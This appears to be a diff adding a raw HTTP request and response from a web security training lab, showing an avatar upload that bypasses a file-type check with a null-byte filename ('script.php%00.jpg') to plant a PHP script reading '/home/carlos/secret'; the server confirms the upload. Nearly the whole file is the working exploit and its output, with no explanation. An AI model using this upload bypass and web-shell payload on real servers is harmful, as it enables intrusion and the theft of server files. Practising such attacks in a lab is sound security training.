@@ -1,0 +1,46 @@
+POST https://0a6400c9037acbd6dd183e1600f900b7.web-security-academy.net/my-account/avatar HTTP/1.1
+host: 0a6400c9037acbd6dd183e1600f900b7.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------170509236111380678793124537941
+content-length: 555
+Origin: https://0a6400c9037acbd6dd183e1600f900b7.web-security-academy.net
+Connection: keep-alive
+Referer: https://0a6400c9037acbd6dd183e1600f900b7.web-security-academy.net/my-account?id=wiener
+Cookie: session=qkRKwzq1mx3LGabi7Y2wJ3AIAJHqd73X
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+
+-----------------------------170509236111380678793124537941
+Content-Disposition: form-data; name="avatar"; filename="script.php%00.jpg"
+Content-Type: application/x-php
+
+<?php
+    echo file_get_contents("/home/carlos/secret");
+?>
+-----------------------------170509236111380678793124537941
+Content-Disposition: form-data; name="user"
+
+wiener
+-----------------------------170509236111380678793124537941
+Content-Disposition: form-data; name="csrf"
+
+RDltATuTtTWDhfIXHpfGONnTCGzubE1x
+-----------------------------170509236111380678793124537941--
+HTTP/1.1 200 OK
+Date: Thu, 09 Jan 2025 16:24:24 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Keep-Alive: timeout=5, max=100
+Connection: close
+Content-Type: text/html; charset=UTF-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 131
+
+The file avatars/script.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
